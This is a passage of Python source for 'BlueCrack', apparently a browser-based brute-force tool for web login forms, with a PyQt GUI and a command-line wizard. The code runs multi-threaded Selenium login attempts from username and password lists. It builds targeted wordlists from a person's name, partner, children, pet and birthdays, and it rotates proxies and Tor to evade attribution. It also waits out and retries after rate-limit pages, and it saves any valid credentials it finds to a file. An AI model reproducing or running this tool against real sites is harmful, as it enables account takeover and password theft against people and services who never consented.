                box_layout.addWidget(val)
                return frame, val

            elapsed_box, self.elapsed_val = _make_stat_box("ELAPSED", "00:00:00")
            speed_box, self.speed_val = _make_stat_box("SPEED", "0.0/s")
            eta_box, self.eta_val = _make_stat_box("ETA", "--:--:--")
            hits_box, self.hits_val = _make_stat_box("HITS", "0")

            footer_layout.addWidget(elapsed_box, stretch=1)
            footer_layout.addWidget(speed_box, stretch=1)
            footer_layout.addWidget(eta_box, stretch=1)
            footer_layout.addWidget(hits_box, stretch=1)
            
            root.addWidget(footer_frame)

            # ── Status bar line ──
            self.status_lbl = QLabel("Ready.")
            self.status_lbl.setObjectName("statusLabel")
            root.addWidget(self.status_lbl)

            # ── Stats Timer ──
            self._stats_timer = QTimer(self)
            self._stats_timer.setInterval(1000)
            self._stats_timer.timeout.connect(self._update_elapsed)
            self._total_combos: int = 0
            self._current_metrics: Dict[str, Any] = {}

            # ── Keyboard shortcuts ──
            QShortcut(QKeySequence("Ctrl+X"), self, activated=self._stop_attack)

        # ── Helpers ──
        def _pick_file(self, target: QLineEdit) -> None:
            """Open a file dialog and set the selected file path into the target QLineEdit."""
            f, _ = QFileDialog.getOpenFileName(
                self, "Open File", "", "Text Files (*.txt);;All Files (*)"
            )
            if f:
                target.setText(f)

        def _log(self, msg: str) -> None:
            """Append a message to the log text area."""
            self.log_txt.append(msg)

        def _toggle_theme(self) -> None:
            """Toggle between dark and light themes."""
            app_inst = QApplication.instance()
            if app_inst is None:
                return
            if self._is_dark:
                app_inst.setStyleSheet(LIGHT_STYLE)
                self.theme_btn.setText("☾")
                self._is_dark = False
            else:
                app_inst.setStyleSheet(DARK_STYLE)
                self.theme_btn.setText("☼")
                self._is_dark = True

        def _export_log(self) -> None:
            """Export the current log contents to a timestamped file."""
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"bluecrack_log_{timestamp}.txt"
            try:
                content = self.log_txt.toPlainText()
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(content)
                self._log(f"[+] Log exported to: {os.path.abspath(filename)}")
                self.status_lbl.setText(f"Log exported: {filename}")
            except Exception as e:
                self._log(f"[-] Export failed: {e}")

        def _update_elapsed(self) -> None:
            """Update the elapsed time label (called by timer every second)."""
            if self._attack_start_time > 0:
                elapsed = time.time() - self._attack_start_time
                h, rem = divmod(int(elapsed), 3600)
                m, s = divmod(rem, 60)
                self.elapsed_val.setText(f"{h:02d}:{m:02d}:{s:02d}")

                attempted = self._current_metrics.get("attempted", 0)
                if elapsed > 0 and attempted > 0:
                    rate = attempted / elapsed
                    self.speed_val.setText(f"{rate:.1f}/s")

                    remaining = self._total_combos - attempted
                    if rate > 0 and remaining > 0:
                        eta_sec = remaining / rate
                        eh, erem = divmod(int(eta_sec), 3600)
                        em, es = divmod(erem, 60)
                        self.eta_val.setText(f"{eh:02d}:{em:02d}:{es:02d}")
                    elif remaining <= 0:
                        self.eta_val.setText("00:00:00")

        def _on_metrics(self, metrics: Dict[str, Any]) -> None:
            """Handle metrics signal from the worker thread."""
            self._current_metrics = metrics
            self.hits_val.setText(str(metrics.get("successes", 0)))

        # ── CUPP ──
        def _run_cupp(self) -> None:
            """Launch a CUPP wordlist generation in a background thread."""
            name = self.cupp_name.text().strip()
            if not name:
                QMessageBox.warning(self, "CUPP", "First Name is required.")
                return
            profile: Dict[str, Any] = {
                "name": name.lower(),
                "surname": self.cupp_surname.text().strip().lower(),
                "nick": self.cupp_nick.text().strip().lower(),
                "birthdate": self.cupp_bday.text().strip(),
                "wife": self.cupp_partner.text().strip().lower(),
                "wifen": self.cupp_partner_nick.text().strip().lower(),
                "wifeb": self.cupp_partner_bday.text().strip(),
                "kid": self.cupp_child.text().strip().lower(),
                "kidn": self.cupp_child_nick.text().strip().lower(),
                "kidb": self.cupp_child_bday.text().strip(),
                "pet": self.cupp_pet.text().strip().lower(),
                "company": self.cupp_company.text().strip().lower(),
                "words": [
                    w.strip()
                    for w in self.cupp_keywords.text().split(",")
                    if w.strip()
                ]
                or [""],
                "spechars1": "y" if self.cupp_specchars.isChecked() else "n",
                "randnum": "y" if self.cupp_randnum.isChecked() else "n",
                "leetmode": "y" if self.cupp_leet.isChecked() else "n",
            }
            self.cupp_gen_btn.setEnabled(False)
            self.cupp_gen_btn.setText("GENERATING...")
            self._cupp_thread = CuppWorkerThread(profile)
            self._cupp_thread.log_signal.connect(self._log)
            self._cupp_thread.finished_signal.connect(self._cupp_done)
            self._cupp_thread.start()

        def _cupp_done(self, path: str) -> None:
            """Handle CUPP generation completion."""
            self.cupp_gen_btn.setEnabled(True)
            self.cupp_gen_btn.setText("GENERATE PROFILE")
            self._cupp_result_path = path
            if path:
                self.cupp_use_btn.setEnabled(True)
                self.status_lbl.setText(f"CUPP wordlist: {path}")

        def _run_sequence(self) -> None:
            """Generate a numeric sequence wordlist."""
            prefix = self.seq_prefix.text()
            suffix = self.seq_suffix.text()
            start = self.seq_start.value()
            end = self.seq_end.value()
            pad = self.seq_pad.value()

            if start > end:
                QMessageBox.warning(
                    self,
                    "Error",
                    "Start Number must be less than or equal to End Number.",
                )
                return

            self.seq_gen_btn.setEnabled(False)
            self.seq_gen_btn.setText("GENERATING...")

            try:
                out_path = os.path.abspath("sequence_wordlist.txt")
                with open(out_path, "w", encoding="utf-8") as f:
                    for i in range(start, end + 1):
                        num_str = str(i).zfill(pad)
                        f.write(f"{prefix}{num_str}{suffix}\n")

                self._log(
                    f"[+] Sequence wordlist generated! ({end - start + 1} passwords) → {out_path}"
                )
                self._cupp_result_path = out_path
                self.cupp_use_btn.setEnabled(True)
                self.status_lbl.setText(f"Sequence wordlist: {out_path}")
            except Exception as e:
                self._log(f"[-] Sequence generation error: {e}")
            finally:
                self.seq_gen_btn.setEnabled(True)
                self.seq_gen_btn.setText("GENERATE SEQUENCE")

        def _use_cupp_result(self) -> None:
            """Copy the CUPP result path to the password input field."""
            if self._cupp_result_path:
                self.pass_in.setText(self._cupp_result_path)
                self.tabs.setCurrentIndex(0)
                self._log(f"[+] Password list set to: {self._cupp_result_path}")

        # ── Attack ──
        def _start_attack(self) -> None:
            """Validate inputs and launch the attack worker thread."""
            url = self.url_in.text().strip()
            if not url:
                QMessageBox.critical(self, "Error", "Enter a Target URL.")
                return
            if not url.startswith("http"):
                url = "http://" + url

            up = self.user_in.text().strip()
            users: List[str] = []
            if os.path.isfile(up):
                with open(up, encoding="utf-8", errors="ignore") as f:
                    users = [x.strip() for x in f if x.strip()]
            elif up:
                users = [up]

            pp = self.pass_in.text().strip()
            passwords: List[str] = []
            if os.path.isfile(pp):
                with open(pp, encoding="utf-8", errors="ignore") as f:
                    passwords = [x.strip() for x in f if x.strip()]
            elif pp:
                passwords = [pp]

            if not users or not passwords:
                QMessageBox.critical(
                    self, "Error", "Provide valid user and password input."
                )
                return

            proxies_list: List[str] = []
            px = self.proxy_in.text().strip()
            if os.path.isfile(px):
                with open(px, encoding="utf-8", errors="ignore") as f:
                    proxies_list = [x.strip() for x in f if x.strip()]
            elif px:
                proxies_list = [px]

            ctx: Dict[str, Any] = {
                "target_url": url,
                "users": users,
                "passwords": passwords,
                "threads": self.threads_in.value(),
                "delay": self.delay_in.value(),
                "jitter": self.jitter_in.value(),
                "error_msg": self.err_in.text().strip().lower(),
                "limit_text": self.limit_in.text().strip().lower(),
                "cooldown": self.cooldown_in.value(),
                "headless": self.headless_cb.isChecked(),
                "proxies": proxies_list,
                "use_tor": self.tor_cb.isChecked(),
                "tor_port": self.tor_port_in.value(),
                "tor_shift_every": self.tor_every_in.value(),
                "success_msg": self.success_in.text().strip(),
                "max_attempts": self.max_attempts_in.value(),
                "continue_after_success": self.continue_cb.isChecked(),
            }

            total = len(users) * len(passwords)
            self._total_combos = total
            self.progress.setMaximum(total)
            self.progress.setValue(0)
            self.progress.setStyleSheet("")  # Reset any custom style
            self.log_txt.clear()
            self._log(f"[*] Target: {url}")
            self._log(
                f"[*] {len(users)} user(s)  ×  {len(passwords)} password(s)  =  {total} combos"
            )
            self._log(
                f"[*] Threads: {ctx['threads']}   Tor: {'ON' if ctx['use_tor'] else 'OFF'}"
            )
            if ctx["success_msg"]:
                self._log(f"[*] Success text: '{ctx['success_msg']}'")
            if ctx["max_attempts"] > 0:
                self._log(f"[*] Max attempts: {ctx['max_attempts']}")

            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.status_lbl.setText("Running...")

            # Reset footer stats
            self._attack_start_time = time.time()
            self._current_metrics = {}
            self.elapsed_val.setText("00:00:00")
            self.speed_val.setText("0.0/s")
            self.eta_val.setText("--:--:--")
            self.hits_val.setText("0")
            self._stats_timer.start()

            self.worker_thread = GuiWorkerThread(ctx)
            self.worker_thread.log_signal.connect(self._log)
            self.worker_thread.progress_signal.connect(self._on_progress)
            self.worker_thread.finished_signal.connect(self._on_finished)
            self.worker_thread.metrics_signal.connect(self._on_metrics)
            self.worker_thread.start()

        def _stop_attack(self) -> None:
            """Request the worker thread to stop."""
            if self.worker_thread and self.worker_thread.isRunning():
                self._log("[!] Stop requested — finishing current attempts...")
                self.worker_thread.request_stop()
                self.status_lbl.setText("Stopping...")

        def _on_progress(self, cur: int, total: int) -> None:
            """Update the progress bar."""
            self.progress.setValue(cur)
            self.status_lbl.setText(f"Progress: {cur}/{total}")

        def _on_finished(self, found: bool, msg: str) -> None:
            """Handle attack completion."""
            self._stats_timer.stop()
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.status_lbl.setText(msg)

            # Final elapsed update
            if self._attack_start_time > 0:
                elapsed = time.time() - self._attack_start_time
                h, rem = divmod(int(elapsed), 3600)
                m, s = divmod(rem, 60)
                self.elapsed_val.setText(f"{h:02d}:{m:02d}:{s:02d}")
                self.eta_val.setText("00:00:00")

            if found:
                self.progress.setStyleSheet(
                    "QProgressBar::chunk { background: qlineargradient("
                    "x1:0,y1:0,x2:1,y2:0, stop:0 #10b981, stop:1 #059669);"
                    " border-radius: 7px; }"
                )
                QMessageBox.information(self, "Success", msg)
            else:
                self.progress.setStyleSheet(
                    "QProgressBar::chunk { background: qlineargradient("
                    "x1:0,y1:0,x2:1,y2:0, stop:0 #ef4444, stop:1 #dc2626);"
                    " border-radius: 7px; }"
                )
                QMessageBox.warning(self, "Finished", msg)

    # ── Launch the GUI ──
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    app.setStyleSheet(DARK_STYLE)
    win = BlueCrackGUI()
    win.show()
    sys.exit(app.exec())
    # GUI mode exits here — CLI code below never runs

# ═══════════════════════════════════════════════════════════════════
# ██  CLI MODE  ██
# ═══════════════════════════════════════════════════════════════════

# INTERACTIVE MODE
if args.interactive:
    print(f"\n{_CYAN}--- WIZARD MODE ---{_RESET}")

    # CUPP Integration
    run_cupp = (
        input("\nGenerate a targeted wordlist first using CUPP? (y/n) [default: n]: ")
        .strip()
        .lower()
        == "y"
    )
    if run_cupp:
        print(
            f"\n{_YELLOW}--- LAUNCHING CUPP (Common User Passwords Profiler) ---{_RESET}"
        )
        if os.path.exists("cupp.py"):
            os.system(f"{sys.executable} cupp.py -i")
            print(
                f"\n{_GREEN}[+] CUPP completed! Make sure to remember the saved filename.{_RESET}\n"
            )
        else:
            print(f"\n{_RED}❌ cupp.py not found in the directory. Skipping...{_RESET}\n")

    args.url = input("\nEnter Target URL: ").strip()
    args.username = (
        input("Enter single username to test (leave blank to skip): ").strip() or None
    )
    if not args.username:
        args.userfile = input("Enter path to usernames list file: ").strip() or None

    # Get password approach correctly in wizard
    single_pass = input("Enter single password to test (leave blank to skip): ").strip()
    if single_pass:
        args.password = single_pass
        args.passfile = None
    else:
        args.password = None
        args.passfile = input("Enter path to passwords list file: ").strip() or None

    threads_in_str = input("Enter number of threads [default: 1]: ").strip()
    args.threads = int(threads_in_str) if threads_in_str.isdigit() else 1

    err_in_str = input("Enter error string to check (default: empty): ").strip()
    if err_in_str:
        args.error = err_in_str

    succ_in_str = input("Enter success string to check (default: empty): ").strip()
    if succ_in_str:
        args.success = succ_in_str

    delay_in_str = input(
        "Enter general delay between attempts in seconds [default: 0]: "
    ).strip()
    args.delay = (
        float(delay_in_str) if delay_in_str.replace(".", "", 1).isdigit() else 0.0
    )

    jitter_in_str = input(
        "Enter jitter/randomizer up to X seconds [default: 0.0]: "
    ).strip()
    args.jitter = (
        float(jitter_in_str) if jitter_in_str.replace(".", "", 1).isdigit() else 0.0
    )

    use_proxy = input("Use proxy? (y/n) [default: n]: ").strip().lower() == "y"
    if use_proxy:
        p_file = input(
            "Enter path to proxy list file (or hit enter to use single proxy): "
        ).strip()
        if p_file:
            args.proxyfile = p_file
        else:
            args.proxy = input(
                "Enter proxy IP:PORT (e.g., http://1.2.3.4:8080): "
            ).strip()

    rl_bypass = (
        input("Enable Auto-Throttle for Rate Limits? (y/n) [default: y]: ")
        .strip()
        .lower()
        != "n"
    )
    args.cooldown = 12 if rl_bypass else 0
    if rl_bypass:
        rl_text = input(
            "Enter Rate Limit text to detect [default: 'too many requests']: "
        ).strip()
        if rl_text:
            args.limit_text = rl_text

    max_att_str = input("Max attempts (0=unlimited) [default: 0]: ").strip()
    args.max_attempts = int(max_att_str) if max_att_str.isdigit() else 0

    cont_str = input(
        "Continue testing after finding credentials? (y/n) [default: n]: "
    ).strip().lower()
    args.continue_after_success = cont_str == "y"

    auto_detect = (
        input("Auto-detect CSS selectors instead of clicking? (y/n) [default: y]: ")
        .strip()
        .lower()
        != "n"
    )
else:
    auto_detect = False
    if not args.url:
        raise SystemExit(f"{_RED}❌ Provide --url or use -i wizard{_RESET}")

if not args.username and not args.userfile:
    raise SystemExit(f"{_RED}❌ Provide -u USER or -U USERFILE{_RESET}")

if not args.password and not args.passfile:
    raise SystemExit(f"{_RED}❌ Provide -p PASS or -P PASSLIST{_RESET}")

# LOAD USERNAMES
users: List[str] = []

if args.username:
    users.append(args.username)

if args.userfile:
    with open(args.userfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            users.append(line.strip())

# LOAD PASSWORDS
passwords: List[str] = []

if args.password:
    passwords.append(args.password)

if args.passfile:
    with open(args.passfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            px = line.strip()
            if px:  # Avoid empty strings creating false-positive vulnerabilities
                passwords.append(px)

# LOAD PROXIES
proxies: List[str] = []
if args.proxy:
    proxies.append(args.proxy)
if args.proxyfile:
    with open(args.proxyfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if line.strip():
                proxies.append(line.strip())

USERNAME_FIXED: Optional[str] = users[0] if len(users) == 1 else None
USERLIST: Optional[List[str]] = users if len(users) > 1 else None

PASSWORD_FIXED: Optional[str] = passwords[0] if len(passwords) == 1 else None
PASSLIST: Optional[List[str]] = passwords if len(passwords) > 1 else None
WORDLIST: str = f"{len(passwords)} passwords loaded for {len(users)} users"
PROXY_INFO: str = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"

THREADS: int = args.threads
TARGET_URL: str = args.url
if (
    TARGET_URL
    and not TARGET_URL.startswith("http://")
    and not TARGET_URL.startswith("https://")
):
    TARGET_URL = "http://" + TARGET_URL
ERROR_MSG: Optional[str] = args.error.lower() if args.error else None
SUCCESS_MSG: Optional[str] = args.success.lower() if args.success else None
LIMIT_TEXT: Optional[str] = args.limit_text.lower() if args.limit_text else None
COOLDOWN: int = args.cooldown
DELAY: float = args.delay
JITTER: float = args.jitter
RUN_HEADLESS: bool = args.headless
MAX_ATTEMPTS: int = args.max_attempts
CONTINUE_AFTER_SUCCESS: bool = args.continue_after_success
OUTPUT_FILE: str = args.output
JSON_REPORT: bool = args.json_report

# LAUNCH SELENIUM (setup browser)
driver = webdriver.Chrome()
driver.get(TARGET_URL)

username_selector: Optional[str] = None
password_selector: Optional[str] = None
submit_selector: Optional[str] = None

print("\n==============================")
print("🔥 BROWSER BRUTE TESTER 🔥")
print("==============================\n")
print(f"Target URL: {TARGET_URL}")
print(f"User: {USERNAME_FIXED}")
print(f"Wordlist: {WORDLIST}")
print(f"Proxies: {PROXY_INFO}")
print(f"Threads: {THREADS}")
print(f"Delay/Jitter: {DELAY}s / {JITTER}s")
if MAX_ATTEMPTS > 0:
    print(f"Max Attempts: {MAX_ATTEMPTS}")
if CONTINUE_AFTER_SUCCESS:
    print(f"{_CYAN}[*] Will continue after finding credentials{_RESET}")

# Inject JS to track last clicked element
driver.execute_script(CLICK_LISTENER_JS)


# GENERATE CSS SELECTOR FROM CLICKED ELEMENT
def get_css_selector() -> Optional[str]:
    """Get the CSS selector of the last clicked element in the setup browser.

    Returns:
        CSS selector string or None if no element was clicked.
    """
    elem = driver.execute_script("return window._lastClicked")
    if elem is None:
        return None
    return driver.execute_script(CSS_PATH_JS, elem)


if auto_detect:
    print(f"\n{_CYAN}🔍 Auto-detecting login form fields...{_RESET}")
    time.sleep(2)
    try:
        driver.execute_script(AUTO_DETECT_JS)
        detected_selectors = driver.execute_script("return window._autoFindFields();")
        if detected_selectors and detected_selectors[0] and detected_selectors[1]:
            username_selector, password_selector = detected_selectors
            print(f"{_GREEN}✅ AUTO-DETECTED Username: {username_selector}{_RESET}")
            print(f"{_GREEN}✅ AUTO-DETECTED Password: {password_selector}{_RESET}")
        else:
            print(f"{_RED}❌ Auto-detect failed. Please lock manually.{_RESET}")
            auto_detect = False
    except Exception as e:
        print(
            f"{_RED}❌ Auto-detect script failed: {e}. Switching to manual mode.{_RESET}"
        )
        auto_detect = False

# WAIT FOR USER TO LOCK FIELDS
if not auto_detect:
    print(f"\n{_CYAN}👉 CLICK username field → press S{_RESET}")
    print(f"{_CYAN}👉 CLICK password field → press T{_RESET}")
    print(f"{_CYAN}👉 Press ENTER to start brute{_RESET}\n")

while username_selector is None or password_selector is None:
    if keyboard.is_pressed("s"):
        css = get_css_selector()
        if css:
            username_selector = css
            print(f"{_BLUE}🔵 Username selector LOCKED: {css}{_RESET}")
        time.sleep(0.3)
    if keyboard.is_pressed("t"):
        css = get_css_selector()
        if css:
            password_selector = css
            print(f"{_BLUE}🟣 Password selector LOCKED: {css}{_RESET}")
        time.sleep(0.3)

print("\nSelectors locked! Press ENTER to launch brute...")

# TEST THE SELECTORS IMMEDIATELY
driver.find_element(By.CSS_SELECTOR, username_selector)
driver.find_element(By.CSS_SELECTOR, password_selector)

keyboard.wait("enter")

# LOAD WORDLIST INTO QUEUE
q: Queue = Queue(maxsize=1000)
total_combos: int = len(users) * len(passwords)

# CLI metrics
_cli_metrics: Dict[str, int] = {
    "attempted": 0,
    "successes": 0,
    "failures": 0,
    "errors": 0,
    "rate_limit_hits": 0,
    "skipped_empty": 0,
    "requeued": 0,
}
_cli_metrics_lock = threading.Lock()
_cli_found_creds: List[Tuple[str, str]] = []
_cli_found_creds_lock = threading.Lock()
_cli_found_users: Set[str] = set()
_cli_found_users_lock = threading.Lock()
_cli_start_time: float = time.time()


def populate() -> None:
    """Populate the work queue with (user, password) combos."""
    for user in users:
        for pwd in passwords:
            q.put((user, pwd))


threading.Thread(target=populate, daemon=True).start()


# WORKER FUNCTION
def worker() -> None:
    """CLI worker function — runs in a thread, tests credentials via Selenium."""
    global total_combos

    ctx: Dict[str, Any] = {
        "headless": RUN_HEADLESS,
        "proxies": proxies,
        "use_tor": False,
    }
    options = build_chrome_options(ctx)

    thread_driver = create_driver_safe(options)
    if thread_driver is None:
        print(f"{_RED}[-] Thread initialization failed: could not create WebDriver{_RESET}")
        return

    try:
        while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
            # Check max attempts
            if MAX_ATTEMPTS > 0:
                with _cli_metrics_lock:
                    if _cli_metrics["attempted"] >= MAX_ATTEMPTS:
                        break

            # Check if we should stop (non-continue mode)
            if not CONTINUE_AFTER_SUCCESS and _FOUND_EVENT.is_set():
                break

            user, pwd = q.get()

            # Skip empty passwords
            if not pwd or str(pwd).strip() == "":
                with _cli_metrics_lock:
                    _cli_metrics["skipped_empty"] += 1
                q.task_done()
                continue

            # Skip already solved users (unless continue mode)
            if not CONTINUE_AFTER_SUCCESS:
                with _cli_found_users_lock:
                    if user in _cli_found_users:
                        q.task_done()
                        continue

            try:
                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                    break
                if _GLOBAL_STOP.is_set():
                    break

                # Add delay if configured
                actual_delay: float = DELAY
                if JITTER > 0.0:
                    actual_delay += random.uniform(0, JITTER)

                if actual_delay > 0.0:
                    for _ in range(int(actual_delay * 10)):
                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                            break
                        time.sleep(0.1)

                if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                    break

                thread_driver.get(TARGET_URL)
                if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                    break

                try:
                    u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
                    p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
                    u.clear()
                    u.send_keys(user)
                    p.clear()
                    p.send_keys(pwd)
                    p.send_keys(Keys.ENTER)

                    with _cli_metrics_lock:
                        _cli_metrics["attempted"] += 1
                        attempt_num = _cli_metrics["attempted"]

                    if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                        break

                    print(
                        f"[{attempt_num}/{total_combos}] {_CYAN}[*]{_RESET} Trying: {user} / {pwd}"
                    )

                    # Wait for login to process
                    for _ in range(20):
                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                            break
                        time.sleep(0.1)

                    if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                        break

                    # Check page
                    page_source: str = thread_driver.page_source.lower()
                    current_url: str = thread_driver.current_url

                    # Check for rate limiting first
                    if LIMIT_TEXT and LIMIT_TEXT in page_source:
                        print(
                            f"[{attempt_num}/{total_combos}] {_YELLOW}[!] Rate Limit detected ('{LIMIT_TEXT}')!{_RESET}"
                        )
                        with _cli_metrics_lock:
                            _cli_metrics["rate_limit_hits"] += 1
                        if COOLDOWN > 0:
                            print(
                                f"{_CYAN}[~] Bypassing... Sleeping {COOLDOWN} seconds before retrying {user}/{pwd}{_RESET}"
                            )
                            for _ in range(COOLDOWN * 10):
                                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                                    break
                                time.sleep(0.1)
                            if not _FOUND_EVENT.is_set() or CONTINUE_AFTER_SUCCESS:
                                q.put((user, pwd))
                                with _cli_metrics_lock:
                                    _cli_metrics["requeued"] += 1
                        else:
                            print(
                                f"{_RED}[-] Rate limit hit, skipping {user}/{pwd}...{_RESET}"
                            )
                        continue

                    # Check explicit error
                    if ERROR_MSG and ERROR_MSG in page_source:
                        with _cli_metrics_lock:
                            _cli_metrics["failures"] += 1
                        continue

                    # Determine success
                    is_success = False
                    if SUCCESS_MSG:
                        if SUCCESS_MSG in page_source:
                            is_success = True
                        else:
                            with _cli_metrics_lock:
                                _cli_metrics["failures"] += 1
                            continue
                    elif current_url != TARGET_URL and "login" not in current_url.lower():
                        is_success = True
                    elif ERROR_MSG:
                        is_success = True

                    if is_success:
                        print(
                            f"\n{_GREEN}{_BOLD}[+] 🔥🔥 VALID CREDENTIALS FOUND: {user} / {pwd} 🔥🔥{_RESET}\n"
                        )
                        with _cli_metrics_lock:
                            _cli_metrics["successes"] += 1
                        with _cli_found_creds_lock:
                            _cli_found_creds.append((user, pwd))
                        with _cli_found_users_lock:
                            _cli_found_users.add(user)

                        try:
                            with open(OUTPUT_FILE, "a", encoding="utf-8") as cf:
                                cf.write(f"{TARGET_URL} - {user}:{pwd}\n")
                        except Exception as e:
                            print(f"{_RED}[-] Could not save credential: {e}{_RESET}")

                        if not CONTINUE_AFTER_SUCCESS:
                            _FOUND_EVENT.set()
                            with q.mutex:
                                q.queue.clear()
                            break
                    else:
                        with _cli_metrics_lock:
                            _cli_metrics["failures"] += 1

                except (NoSuchElementException, WebDriverException) as e:
                    with _cli_metrics_lock:
                        _cli_metrics["errors"] += 1
                    print(
                        f"{_RED}[-] Error during attempt with '{user} / {pwd}': element not found or page not loaded properly.{_RESET}"
                    )
            except Exception as e:
                with _cli_metrics_lock:
                    _cli_metrics["errors"] += 1
                print(f"{_RED}[-] Navigation or unexpected error: {e}{_RESET}")
            finally:
                q.task_done()
    finally:
        try:
            thread_driver.quit()
        except Exception:
            pass


# Close the initial setup driver
try:
    driver.quit()
except Exception:
    pass

# THREAD LAUNCHER
threads_list: List[threading.Thread] = []
print(f"\n[*] Starting {THREADS} threads...\n")
try:
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads_list.append(t)

    # Wait for completion
    while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
        time.sleep(0.1)

    if not _FOUND_EVENT.is_set():
        q.join()

    cli_end_time = time.time()

    if not _FOUND_EVENT.is_set():
        print(f"\n{_RED}[-] Finished testing. No valid credentials found.{_RESET}")
    else:
        print(f"\n{_GREEN}[+] Finished testing. Valid credentials found!{_RESET}")

    # Print summary
    print(f"\n{_CYAN}═══ Attack Summary ═══{_RESET}")
    for k, v in _cli_metrics.items():
        print(f"  {k}: {v}")
    elapsed = cli_end_time - _cli_start_time
    print(f"  elapsed: {elapsed:.1f}s")
    if _cli_metrics["attempted"] > 0 and elapsed > 0:
        print(f"  speed: {_cli_metrics['attempted'] / elapsed:.1f} attempts/s")

    # Save JSON report if requested
    if JSON_REPORT:
        _save_json_report(
            "bluecrack_cli_report.json",
            TARGET_URL,
            _cli_metrics,
            _cli_found_creds,
            _cli_start_time,
            cli_end_time,
        )
        print(f"{_GREEN}[+] JSON report saved to bluecrack_cli_report.json{_RESET}")

except KeyboardInterrupt:
    print(f"\n{_YELLOW}[!] Interrupted by user (Ctrl+C). Exiting gracefully...{_RESET}")
    _FOUND_EVENT.set()
    _GLOBAL_STOP.set()
finally:
    if _GLOBAL_STOP.is_set() and not _FOUND_EVENT.is_set():
        print(f"\n{_YELLOW}[!] Stopped by signal. Cleaning up...{_RESET}")
    pass
